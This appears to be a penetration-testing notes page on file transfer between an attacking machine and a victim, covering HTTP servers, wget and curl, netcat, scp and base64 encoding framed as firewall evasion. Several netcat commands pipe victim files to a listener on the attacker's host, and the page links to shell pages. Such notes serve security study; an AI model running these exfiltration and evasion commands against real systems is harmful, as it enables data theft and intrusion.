---
title: Transferring files techniques
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - web pentesting
  - server
  - backdoors
---

# Transferring files techniques

## Replicating client-server

### Setting up a server in the attacking machine 

#### Apache server

Once you have a folder structure such as "/var/www/" or "/var/www/html", and also an Apache server installed, you can serve all files from that path by initiating the service:

```bash
service apache2 start
```


#### Simple python server


```shell-session
cd /tmp
python3 -m http.server 8000
```


### Retrieving files from victim's machine

#### wget

```shell-session
wget http://<SERVERIP>:<SERVERPORT>/<file>
```

#### curl

```shell-session
curl http://http://<SERVERIP>:<SERVERPORT>/<file> -o <OutputNameForFile>
```



## Netcat

### Printing information on screen

On the server side (attacking machine):

```bash
#data will be printed on screen
nc -lvp <port>  
```

On the client side (victim's machine):

```bash
echo “hello” | nc -v <ip> <port>
```

###  Transfer data and save it in a file with netcat

On the server side (attacking machine):

```bash
# Data will be stored in reveived.txt file.
nc -lvp <port> > received.txt   
```

On the client side (victim's machine):

```bash
cat tobesentfiel.txt | nc -v <ip> <port>
```


## Using SCP

Two requirements:

 - we have ssh user credentials on the remote host
 - ssh is open on port 22

```shell-session
# Download file foobar.txt in attacker machine from a remote host (victim's machine)
scp username@IPvictim:foobar.txt /some/local/directory

# Upload file foo.txt from attacker machine to a remote host (victim's machine)
scp foo.txt username@IPvictim:/some/remote/directory
```

## Base64

To avoid firewall protections we can:

**1.** Base64 encode the file:

```shell-session
base64 file.php -w 0
```

**2.** Copy the base64 string, go to the remote host and decode it and pipe to a file:

```shell-session
echo "Looooooong-string-encoded-in-base64" | base64 -d > file.php
```


## 

 
## Backdoors

See [reverse shells](reverse-shells.md), [bind shells](bind-shells.md), and [web shells](web-shells.md).



